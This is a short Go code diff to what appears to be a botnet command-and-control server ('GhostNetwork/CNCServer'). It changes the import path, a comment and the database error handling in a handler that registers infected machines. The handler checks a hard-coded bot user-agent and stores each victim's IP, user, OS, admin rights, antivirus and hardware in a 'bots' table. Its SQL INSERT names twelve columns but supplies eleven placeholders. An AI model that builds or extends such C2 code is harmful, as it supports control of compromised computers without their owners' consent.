@@ -9,10 +9,10 @@ import (
 	"net/http"
 	"database/sql"
 
-	"GhostNetwork/CNCServer/database"
+	"github.com/bienkma/GhostNetwork/CNCServer/database"
 )
 
-// Fix user-agent bot client
+// Fix user-agent bot client for Ghost master match.
 var userAgent string = "FLDSH3LFDBVSLfdvfdLDYeuglghjgndghioerGH"
 
 // Index page
@@ -54,8 +54,9 @@ func New(response http.ResponseWriter, request *http.Request) {
 			_, err = db.Exec("INSERT INTO bots(guid, clientip, whoami, os, install, admin, av, cpu, gpu, version, sysinfo, lastcheckin) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
 				bot.GUID, bot.CLIENTIP, bot.WHOAMI, bot.OS, bot.INSTALL, bot.ADMIN, bot.AV, bot.CPU, bot.GPU, bot.VERSION, bot.SYSINFO, bot.LASTCHECKIN)
 			if err != nil {
-				log.Fatal("Error write to DB! " + err.Error())
+				log.Printf("Error write to DB! " + err.Error())
 				fmt.Fprintf(response, "Error insert db")
+				return
 			}
 		case err != nil:
 			fmt.Fprintf(response, "Error")
